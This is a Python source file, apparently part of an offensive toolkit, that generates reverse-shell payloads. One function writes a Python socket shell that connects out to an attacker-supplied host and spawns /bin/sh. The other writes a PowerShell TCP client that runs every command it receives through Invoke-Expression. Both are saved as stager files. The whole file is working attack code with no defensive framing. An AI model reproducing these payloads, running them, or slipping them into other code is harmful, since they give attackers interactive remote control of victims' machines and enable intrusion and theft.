# modules/payloads/reverse_shell.py

import os

def generate_reverse_shell(lhost, lport, filename):
    # Python reverse shell payload generation
    payload = f"""import socket
import subprocess
import os

# Connect to the attacker's server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{lhost}", {lport}))

# Redirect the socket to the system's shell
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

# Execute the shell
p = subprocess.call(["/bin/sh", "-i"]);
"""
    
    # Save the payload to a file
    payload_dir = "stager"
    os.makedirs(payload_dir, exist_ok=True)
    file_path = os.path.join(payload_dir, filename)

    with open(file_path, "w") as f:
        f.write(payload)
    
    print(f"[+] Payload saved to {file_path}")

def generate_powershell_reverse_shell(lhost, lport, filename):
    # PowerShell reverse shell payload generation
    payload = f'''$client = New-Object System.Net.Sockets.TCPClient("{lhost}", {lport})
$stream = $client.GetStream()
$writer = New-Object System.IO.StreamWriter($stream)
$reader = New-Object System.IO.StreamReader($stream)
$buffer = New-Object System.Byte[] 1024
while (($bytesRead = $reader.Read($buffer, 0, $buffer.Length)) -ne 0)
{{
    $data = (New-Object Text.UTF8Encoding).GetString($buffer, 0, $bytesRead)
    $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String)
    $sendback2 = $sendback + "PS " + (pwd).Path + "> "
    $writer.Write($sendback2)
    $writer.Flush()
}}
'''

    # Save the payload to a file
    payload_dir = "stager"
    os.makedirs(payload_dir, exist_ok=True)
    file_path = os.path.join(payload_dir, filename)

    with open(file_path, "w") as f:
        f.write(payload)
    
    print(f"[+] Payload saved to {file_path}")
